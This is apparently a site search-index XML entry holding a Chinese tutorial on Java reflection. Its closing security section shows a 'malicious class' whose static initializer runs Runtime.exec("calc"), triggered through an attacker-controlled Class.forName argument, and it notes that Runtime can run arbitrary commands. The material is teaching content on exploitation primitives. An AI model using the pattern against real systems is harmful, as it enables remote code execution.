<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java反射</title>
    <url>/2023/06/08/Java%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<p>反射：将类的各个组成部分封装为其他对象。</p>
<p>Java代码在计算机中经历了三个阶段：源代码阶段-&gt;Class对象阶段-&gt;Runtime运行时阶段。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1659361692184-df5e15a2-0ff1-47d0-9767-d95ef24a9903.png"
                      alt="image.png"
                ></p>
<p>源代码阶段：在编辑器中写的便是源代码。以.java做后缀。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1658958834552-6f17393d-7d2a-4ef5-bdb4-eb180dd3c51c.png"
                      alt="image.png"
                ></p>
<p>使用javac命令可以将.java文件编译为字节码文件，以.class结尾。此时认为仍处于源代码阶段。如下为class文件，具体含义暂不做分析。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1659050135411-8ee0b254-39b0-4a46-87db-932e25cb1f06.png"
                      alt="image.png"
                ></p>
<p>Class类对象阶段：使用javac编译成的字节码文件经过jvm中ClassLoader的加载，在内存中生成Class类对象。Class类对象由成员变量Field、构造方法Constructor、成员方法Method组成。以上面Person对象为例，经过ClassLoader加载，name和age两个成员变量封装为Field[]对象，Person(){}方法封装为Constructor[]对象，eat(){}方法封装为Methods[]对象。而这个封装的过程便是反射机制。</p>
<p>Runtime阶段：实例化类对象，在内存中生成实例化对象。</p>
<h3 id="获取Class类对象的四种方法"><a href="#获取Class类对象的四种方法" class="headerlink" title="获取Class类对象的四种方法"></a>获取Class类对象的四种方法</h3><p><code>反射的作用：获取Class类对象。</code></p>
<p>针对Java代码在计算机的不同阶段，存在不同的方法来获取Class类对象。</p>
<ol>
<li>源代码阶段：Class.forName(“全类名”)：将字节码文件加载进内存，返回Class类对象。</li>
<li>Class类对象阶段：类名.class：通过类名的属性class获取。</li>
<li>实例化对象阶段：对象.getClass()：getClass()方法在Object类中定义着。</li>
<li>类加载器ClassLoader.getSystemClassLoader().loadClass(“全类名”)</li>
</ol>
<p>编写Person类</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1659366695287-caf09e61-9e59-4862-9839-c7f7880932bb.png"
                      alt="image.png"
                ></p>
<p>获取Class类对象</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1660095967523-d8071b26-459f-4023-847d-0e21f5f1dc45.png"
                      alt="1660095958223.png"
                ></p>
<p>同一个字节码文件(*.class)，在一次程序运行过程中，只会被加载一次。因此获取的四个Class类对象是相等的。</p>
<p>这里有一个容易混淆的地方，我们介绍了四种方法来获取Class类对象，观察其输出结果，均为<code>org.domain.Person</code>。而Java内置的<code>java.lang.Class</code>也叫Class类对象，两者有什么区别和联系？</p>
<p><code>java.lang.Class</code>不只是类对象，还是一个模板，<code>org.domain.Person</code>便是根据该模板生成的，因此<code>org.domain.Person</code>本质上也是<code>java.lang.Class</code>类对象。<code>org.domain.Person</code>下存在一个<code>getClass()</code>方法来获取<code>java.lang.Class</code>对象。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1661613633642-c7d1c555-e496-4d4a-9126-b77e544d9214.png"
                      alt="image.png"
                ></p>
<h3 id="获取Class类成员变量"><a href="#获取Class类成员变量" class="headerlink" title="获取Class类成员变量"></a>获取Class类成员变量</h3><p>获取Class类成员变量主要是为了对其数值进行更改。</p>
<ol>
<li><code>Field[] getFields()</code>、<code>Field getField(String name)</code>获取public修饰的成员变量</li>
<li><code>Field[] getDeclaredFields()</code>、<code>Field getDeclaredField(String name)</code>获取全部成员变量</li>
<li><code>void set(Object obj,Object value)</code>设置field值</li>
<li><code>Object get(Object obj)</code>获取值</li>
<li>针对非public修饰符的成员变量，在单独反射时，需要将其<code>setAccessible(true)</code>;</li>
</ol>
<p>实例：</p>
<p>首先编写Person类如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String a;</span><br><span class="line">    <span class="keyword">protected</span> String b;</span><br><span class="line">    String c;</span><br><span class="line">    <span class="keyword">private</span> String d;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,String a)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.a=a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">( String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String a,String... name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.a=a;</span><br><span class="line">        <span class="keyword">for</span>(String n:name)&#123;</span><br><span class="line">            System.out.println(n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, a=&#x27;&quot;</span> + a + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, b=&#x27;&quot;</span> + b + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, c=&#x27;&quot;</span> + c + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, d=&#x27;&quot;</span> + d + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">(String food)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat...&quot;</span>+food);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用反射机制获取Class类成员变量并修改：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"><span class="keyword">import</span> org.domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span>Person.class;</span><br><span class="line">        <span class="comment">//Field[] getFields()</span></span><br><span class="line">        Field[] fields=cls.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field field:fields)&#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field a=cls.getField(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//获取a的值。get(Object obj)</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Object value=a.get(p);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">        <span class="comment">//设置a的值。set(Object obj,Object value)</span></span><br><span class="line">        a.set(p,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        System.out.println(<span class="string">&quot;================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取全部成员变量。Field[] getDeclaredFields()</span></span><br><span class="line">        Field[] fields1= cls.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field field:fields1)&#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取指定私有成员变量。Field getDeclaredField()</span></span><br><span class="line">        Field d=cls.getDeclaredField(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">        <span class="comment">//忽略访问权限修饰符的安全检查</span></span><br><span class="line">        <span class="comment">//暴力反射</span></span><br><span class="line">        d.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object value2=d.get(p);</span><br><span class="line">        System.out.println(value2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1660098101087-515a945a-b1fe-42da-93c2-11ab37728342.png"
                      alt="image.png"
                ></p>
<h3 id="获取Class类构造方法"><a href="#获取Class类构造方法" class="headerlink" title="获取Class类构造方法"></a>获取Class类构造方法</h3><p>获取构造方法后，可以使用构造方法创建实例化对象</p>
<ol>
<li><code>Constructor&lt;?&gt;[] getConstructors()</code>、<code>Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes)</code>获取public构造方法</li>
<li><code>Constructor&lt;?&gt;[] getDeclaredConstructors()</code>、<code>Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)</code>获取全部构造方法</li>
<li><code>constructor.newInstance()</code> 使用构造方法创建实例化对象。</li>
<li>当使用无参数构造方法创建实例化对象时，可以简化为使用Class类对象操作：<code>class.newInstace()</code>。</li>
<li><code>setAccessible()</code>方法适用</li>
</ol>
<p>实例：Person类保持不变</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Person.class;</span><br><span class="line">        <span class="comment">//Constructor&lt;?&gt;[] getConstructors()</span></span><br><span class="line">        Constructor[] constructors=cls.getConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor constructor:constructors)&#123;</span><br><span class="line">            System.out.println(constructors);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Constructor&lt;?&gt; getConstructor(Class&lt;?&gt;... parameterTypes )</span></span><br><span class="line">        Constructor&lt;?&gt; constructor=cls.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        Object person=constructor.newInstance(<span class="string">&quot;张三&quot;</span>,<span class="number">23</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor1=cls.getConstructor();</span><br><span class="line">        System.out.println(constructor1);</span><br><span class="line">        Object person1=constructor1.newInstance();</span><br><span class="line">        System.out.println(person1);</span><br><span class="line">        <span class="comment">//简化</span></span><br><span class="line">        Object person2=cls.newInstance();</span><br><span class="line">        System.out.println(person2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230609000050942.png"
                      alt="image-20230609000050942"
                ></p>
<h3 id="获取Class类成员方法"><a href="#获取Class类成员方法" class="headerlink" title="获取Class类成员方法"></a>获取Class类成员方法</h3><ol>
<li><code>Method[] getMethods()</code>、<code>Method getMethod(String name,Class&lt;?&gt;... parameterTypes)</code>获取public类成员方法。注意这里获取全部public类成员方法的时候会获取Object类的public成员方法</li>
<li><code>Method[] getDeclaredMethods()</code>、<code>Method getDeclaredMethod(String name,Class&lt;?&gt;... parameterTypes)</code>获取全部类成员方法，当然也包括Object类</li>
<li><code>String method.getName()</code> 获取方法名</li>
<li><code>String class.getName()</code>获取类名</li>
<li><code>method.invoke(Object obj,Class&lt;?&gt;...parameterTypes)</code>执行类成员方法</li>
<li><code>setAccessible()</code>方法适用</li>
</ol>
<p>实例：Person类保持不变</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.security.jgss.GSSUtil;</span><br><span class="line"><span class="keyword">import</span> org.domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class cls=Class.forName(<span class="string">&quot;org.domain.Person&quot;</span>);</span><br><span class="line">        <span class="comment">//获取指定名称的方法</span></span><br><span class="line">        Method eat_method=cls.getMethod(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line">        System.out.println(eat_method);</span><br><span class="line">        <span class="comment">//输出方法名</span></span><br><span class="line">        String eat_methodName=eat_method.getName();</span><br><span class="line">        System.out.println(eat_methodName);</span><br><span class="line">        <span class="comment">//执行方法</span></span><br><span class="line">        Person person=<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        eat_method.invoke(person);</span><br><span class="line">        Method eat_method2=cls.getMethod(<span class="string">&quot;eat&quot;</span>,String.class);</span><br><span class="line">        System.out.println(eat_method2);</span><br><span class="line">        eat_method2.invoke(person,<span class="string">&quot;meet&quot;</span>);</span><br><span class="line">        <span class="comment">//获取全部指定类成员方法</span></span><br><span class="line">        Method[] methods=cls.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method method:methods)&#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String className=cls.getName();</span><br><span class="line">        System.out.println(className);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1660146493707-73a30df7-753b-45e5-81f6-f584a30e63a8.png"
                      alt="image.png"
                ></p>
<h3 id="Java反射与安全"><a href="#Java反射与安全" class="headerlink" title="Java反射与安全"></a>Java反射与安全</h3><p>P牛：Java反射可以给Java这门静态语言赋予动态特性。“⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化，我称之为动态特性 ”。</p>
<p>如下代码中<code>execute</code>方法，根据传入的<code>ClassName</code>参数不同，获取不同的<code>Class</code>类对象。再根据<code>MethodName</code>不同，获取该类对象下的方法。最后使用<code>invoke</code>方法来执行该方法。</p>
<p>当不知道传入的参数是什么的时候，这段代码最终实现的功能是未知的。这便是动态特性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String ClassName,String MethodName)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class cls=Class.forName(ClassName);</span><br><span class="line">        cls.getMethod(MethodName).invoke(cls.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        String ClassName=sc.next();</span><br><span class="line">        String MethodName=sc.next();</span><br><span class="line">        ReflectDemo5 ref=<span class="keyword">new</span> <span class="title class_">ReflectDemo5</span>();</span><br><span class="line">        ref.execute(ClassName,MethodName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一个容易忽略的点，<code>forName</code>是<code>java.lang.Class</code>类的static方法，只要我们能拿到<code>java.lang.Class</code>类便可以执行<code>forName</code>，而在“获取Class类对象的四种方法”小节的最后，我们发现任何Class类都可以通过<code>getClass()</code>方法来获取<code>java.lang.Class</code>对象。</p>
<p>例如存在<code>String a</code>：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1661614173345-b1686b43-85d2-4908-9747-f0224cc7fde8.png"
                      alt="image.png"
                ></p>
<p>当然在本例中的cls3，通过对<code>java.lang.Class</code>对象进行操作，最后又获取到<code>java.lang.Class</code>对象是没什么意义的，这里仅仅是要了解其方法。</p>
<p><code>forName</code>有三个函数重载</p>
<ul>
<li>forName(String className)</li>
<li>forName(String name, boolean initialize,ClassLoader loader)</li>
<li>forName(Module module, String name) &#x2F;&#x2F;模块部分是JDK9添加的特性，还未学习，暂不考虑学习此方法</li>
</ul>
<p>第一个是常见的获取Class的方式。查看器源代码会发现其最后会返回<code>forName0(className, true, ClassLoader.getClassLoader(caller), caller)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">    <span class="keyword">return</span> forName0(className, <span class="literal">true</span>, ClassLoader.getClassLoader(caller), caller);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>至于第二个方法，忽略中间代码，发现其最后返回<code>forName0(name, initialize, loader, caller)</code>，由此可知，方法二是对方法一的一个封装。默认了<code>initialize</code>和<code>loader</code>两个参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String name, <span class="type">boolean</span> initialize,</span><br><span class="line">                               ClassLoader loader)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">    Class&lt;?&gt; caller = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// Reflective call to get caller class is only needed if a security manager</span></span><br><span class="line">    <span class="comment">// is present.  Avoid the overhead of making this call otherwise.</span></span><br><span class="line">    caller = Reflection.getCallerClass();</span><br><span class="line">    <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> ClassLoader.getClassLoader(caller);</span><br><span class="line">    <span class="keyword">if</span> (ccl != <span class="literal">null</span>) &#123;</span><br><span class="line">    sm.checkPermission(</span><br><span class="line">    SecurityConstants.GET_CLASSLOADER_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> forName0(name, initialize, loader, caller);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>至于两个参数的含义，<code>initialize</code>表示是否进行初始化，<code>loader</code>表示<code>ClassLoader</code>，暂不考虑<code>ClassLoader</code>的学习。</p>
<p>当<code>initialize=true</code>的时候，使用forName来获取Class对象时，Class对象会自动初始化。</p>
<p>在Java中，存在三种初始化方法。分别是<code>static&#123;&#125;</code>，<code>&#123;&#125;</code>和构造函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo7</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ReflectDemo7() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Reflect&quot;</span>);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ReflectDemo7 rf=<span class="keyword">new</span> <span class="title class_">ReflectDemo7</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么三者存在什么区别？</p>
<blockquote>
<p>Person p &#x3D; new Person(“zhangsan”,20); 该句话都做了什么事情？</p>
<ol>
<li>因为new用到了Person.class.所以会先找到Person.class文件并加载到内存中。</li>
<li>执行该类中的static代码块，如果有的话，给Person.class类进行初始化。</li>
<li>在堆内存中开辟空间，分配内存地址。</li>
<li>在堆内存中建立对象的特有属性。并进行默认初始化。</li>
<li>对属性进行显示初始化。</li>
<li>对对象进行构造代码块初始化。</li>
<li>对对象进行对应的构造函数初始化。</li>
<li>将内存地址付给栈内存中的p变量。</li>
</ol>
</blockquote>
<p>从上述可以看出在步骤2就已经运行<code>static&#123;&#125;</code>方法，步骤四运行<code>&#123;&#125;</code>方法，步骤六运行构造代码块。可以运行上面的代码判断顺序是否正确。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662132897467-d153c776-9c17-41f9-a20e-4c866d7ca600.png"
                      alt="image.png"
                ></p>
<p>对比2、4、6三个步骤会发现，<code>static&#123;&#125;</code>方法是对Class类初始化，发生在找到Class类对象的时候。另外两种方法则发生在步骤3分配内存之后。</p>
<p>而我们上面提到的：使用forName来获取Class对象时，Class对象会自动初始化。forName同样存在一个寻找Class类对象的过程，找到对象后执行static方法。但其没有分配内存，也就是后面两种方法并不会执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo7</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ReflectDemo7() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Reflect&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Class.forName(<span class="string">&quot;org.ReflectDemo.ReflectDemo7&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662133910438-148af0b8-4825-491b-ad36-8390a0aa1422.png"
                      alt="image.png"
                ></p>
<p>当我们能够操作如下代码中的<code>className</code>参数时：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String className)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class cls=Class.forName(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以将<code>className</code>指向我们构造的恶意类。其中的<code>static&#123;&#125;</code>方法为构造的恶意方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pr</span> <span class="operator">=</span> rt.exec(command);</span><br><span class="line">            pr.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>除了使用<code>forName()</code>方法指向恶意类外，也可以使用<code>forName()</code>指向Java的内置类，通过这种方法可以省去<code>import</code>。获取Java内置类之后，若存在无参数构造方法，只要使用<code>class.newInstance()</code>，便可将其实例化（上面获取Class类构造方法提到过），而后利用其属性或方法。例如，如果我们可以获取到<code>Runtime</code>类实例，便可以使用<code>exec()</code>方法来执行任意命令。</p>
<p>但是很不幸的是，很多时候<code>class.newInstance()</code>会失效。主要原因：</p>
<ul>
<li>类不存在无参数构造方法</li>
<li>类无参数构造方法是私有的</li>
</ul>
<p>例如<code>Runtime</code>类的无参数构造方法便是<code>private</code>，当需要获取<code>Runtime</code>实例化对象时，需要调用其静态方法<code>getRuntime</code>来返回实例化对象。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662455146683-c2881f52-b8d6-41e1-a754-6985e0f355c3.png"
                      alt="image.png"
                ></p>
<p>这么做的目的涉及到Java的单例模式。</p>
<blockquote>
<p>单例模式，属于创建类型的一种常用的软件设计模式。通过单例模式的方法创建的类在当前进程中只有一个实例（根据需要，也有可能一个线程中属于单例，如：仅线程上下文内使用同一个实例）</p>
</blockquote>
<p>如下代码，通过两次new产生的实例化对象是不同的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReflectDemo8</span><span class="params">()</span>&#123;&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String agrs[])</span>&#123;</span><br><span class="line">        ReflectDemo8 rf1=<span class="keyword">new</span> <span class="title class_">ReflectDemo8</span>();</span><br><span class="line">        ReflectDemo8 rf2=<span class="keyword">new</span> <span class="title class_">ReflectDemo8</span>();</span><br><span class="line">        System.out.println(rf1==rf2);<span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是经过单例模式实例化的对象rf1和rf2是相同的。保证了线程中只存在一个<code>ReflectDemo8</code>实例化对象。</p>
